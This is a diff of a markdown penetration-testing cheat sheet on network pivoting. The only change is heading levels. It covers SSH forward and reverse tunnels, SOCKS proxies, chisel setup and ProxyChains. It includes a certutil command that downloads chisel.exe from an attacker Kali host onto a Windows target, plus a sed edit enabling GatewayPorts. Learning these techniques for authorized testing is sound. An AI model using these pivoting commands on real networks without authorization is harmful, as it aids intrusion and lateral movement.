@@ -1,6 +1,6 @@
-# 1. SSH Tunnels
+## 1. SSH Tunnels
 
-## 1.1. Useful options to use with SSH tunnels
+### 1.1. Useful options to use with SSH tunnels
 
 |Options|Description|
 |---|---|
@@ -11,19 +11,19 @@
 |`-o StrictHostKeyChecking=no`|Automatically add host key to host file (which is piped to `/dev/null` in above option|
 |`-i /tmp/id_ecdsa`|Use identity file at `/tmp/id_ecdsa`|
 
-## 1.2. Forward tunnels
+### 1.2. Forward tunnels
 
 **Forward**: direction of SSH connection is **same** as direction of access
 
-### 1.2.1. Forward static tunnel
+#### 1.2.1. Forward static tunnel
 
-#### Syntax
+##### Syntax
 
 ```sh
 ssh -L [bind_address:]port:host:hostport [user@]hostname
 ```
 
-#### Example
+##### Example
 
 ![image](images/ssh-forward-static.png)
 
@@ -31,15 +31,15 @@ ssh -L [bind_address:]port:host:hostport [user@]hostname
 ssh -L 0.0.0.0:13306:10.0.2.91:3306 -L 0.0.0.0:13389:10.0.2.91:3389 user@10.0.1.81
 ```
 
-### 1.2.2. Forward dynamic tunnel (a.k.a. forward SOCKS proxy)
+#### 1.2.2. Forward dynamic tunnel (a.k.a. forward SOCKS proxy)
 
-#### Syntax
+##### Syntax
 
 ```sh
 ssh -D [bind_address:]port [user@]hostname
 ```
 
-#### Example
+##### Example
 
 ![image](images/ssh-forward-dynamic.png)
 
@@ -47,13 +47,13 @@ ssh -D [bind_address:]port [user@]hostname
 ssh -D 0.0.0.0:1080 user@10.0.1.81
 ```
 
-## 1.3. Reverse Tunnels
+### 1.3. Reverse Tunnels
 
 **Reverse**: direction of SSH connection is **reverse** of direction of access
 
 > [!Tip]
 > 
-> #### For remote port forwarding:
+> ##### For remote port forwarding:
 > 
 > - By default, the listening socket on the server can only bind to the `lo` loopback interface (`127.0.0.1`)
 > - Set `GatewayPorts yes` in the server's `sshd_config` to enable binding to other interfaces
@@ -62,15 +62,15 @@ ssh -D 0.0.0.0:1080 user@10.0.1.81
 > sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
 > ```
 
-### 1.3.1. Reverse static tunnel
+#### 1.3.1. Reverse static tunnel
 
-#### Syntax
+##### Syntax
 
 ```sh
 ssh -R [bind_address:]port:host:hostport [user@]hostname
 ```
 
-#### Example
+##### Example
 
 ![image](images/ssh-reverse-static.png)
 
@@ -78,15 +78,15 @@ ssh -R [bind_address:]port:host:hostport [user@]hostname
 ssh -R 0.0.0.0:13306:10.0.2.91:3306 -R 0.0.0.0:13389:10.0.2.91:3389 user@192.168.2.61
 ```
 
-### 1.3.2. Reverse dynamic tunnel (a.k.a. reverse SOCKS proxy)
+#### 1.3.2. Reverse dynamic tunnel (a.k.a. reverse SOCKS proxy)
 
-#### Syntax
+##### Syntax
 
 ```sh
 ssh -R [bind_addr:]port [user@]hostname
 ```
 
-#### Example
+##### Example
 
 ![image](images/ssh-reverse-dynamic.png)
 
@@ -94,13 +94,13 @@ ssh -R [bind_addr:]port [user@]hostname
 Example: ssh -R 0.0.0.0:1080 user@192.168.2.61
 ```
 
-# 2. Chisel tunnels
+## 2. Chisel tunnels
 
 > [!Tip]
 >
 > [Chisel](https://github.com/jpillora/chisel) is useful for Windows targets that does not have SSH
 
-## 2.1. Preparing chisel binaries
+### 2.1. Preparing chisel binaries
 
 Prepare server on Kali:
 
@@ -125,31 +125,31 @@ Download client binaries on Windows target
 certutil.exe -urlcache -f -split http://kali.vx/chisel.exe %TEMP%\chisel.exe
 ```
 
-## 2.2. Chisel server configuration
+### 2.2. Chisel server configuration
 
-#### Syntax
+##### Syntax
 
 ```sh
 chisel server --reverse --port <port>
 ```
 
-#### Example
+##### Example
 
 ```sh
 chisel server --reverse --port 8080
 ```
 
-## 2.3. Chisel Client configuration
+### 2.3. Chisel Client configuration
 
-### 2.3.1. Reverse port forwarding
+#### 2.3.1. Reverse port forwarding
 
-#### Syntax
+##### Syntax
 
 ```sh
 chisel client <server> [R:[server-port]:[target-address]:[target-port]]
 ```
 
-#### Example
+##### Example
 
 ![image](images/chisel-reverse.png)
 
@@ -157,15 +157,15 @@ chisel client <server> [R:[server-port]:[target-address]:[target-port]]
 chisel client 192.168.2.61:8080 R:13306:10.0.2.91:3306 R:13389:10.0.2.91:3389
 ```
 
-## 2.3.2. Reverse SOCKS proxy
+### 2.3.2. Reverse SOCKS proxy
 
-#### Syntax
+##### Syntax
 
 ```sh
 chisel client <server> R:socks
 ```
 
-#### Example
+##### Example
 
 ![image](images/chisel-reverse-socks.png)
 
@@ -173,7 +173,7 @@ chisel client <server> R:socks
 chisel client 192.168.2.61:8080 R:0.0.0.0:socks
 ```
 
-# 3. ProxyChains
+## 3. ProxyChains
 
 - Consider the reverse dynamic tunnel:
   - The accessing client `192.168.1.51` does not have a route to the `10.0.2.0/24` network
